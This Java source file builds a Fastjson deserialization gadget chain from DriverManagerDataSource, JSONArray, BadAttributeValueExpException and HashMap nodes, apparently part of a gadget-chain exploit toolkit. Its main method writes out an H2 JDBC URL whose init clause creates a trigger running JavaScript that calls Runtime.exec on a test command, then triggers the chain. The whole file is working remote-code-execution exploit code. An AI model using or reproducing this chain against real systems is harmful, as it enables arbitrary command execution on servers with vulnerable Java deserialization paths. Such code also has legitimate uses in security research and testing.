import common.Util;
import gadgets.*;

public class Fastjson4_DriverManagerDataSource {
    public Object getObject (String jdbc) throws Exception {

        Object node1 = DriverManagerDataSourceNode.makeGadget(jdbc);
        Object node2 = JsonArrayNode.makeGadget(2,node1);
        Object node3 = BadAttrValExeNode.makeGadget(node2);
        Object[] array = new Object[]{node1,node3};
        Object node4 = HashMapNode.makeGadget(array);
        return node4;
    }

    public static void main(String[] args) throws Exception {
        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + Util.getDefaultTestCmd() +"\")\njava.lang.Thread.sleep(5000)";
        String jdbc = "jdbc:h2:mem:;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"+ javascript +"'";
        Object object = new Fastjson4_DriverManagerDataSource().getObject(jdbc);
        Util.runGadgets(object);
    }
}
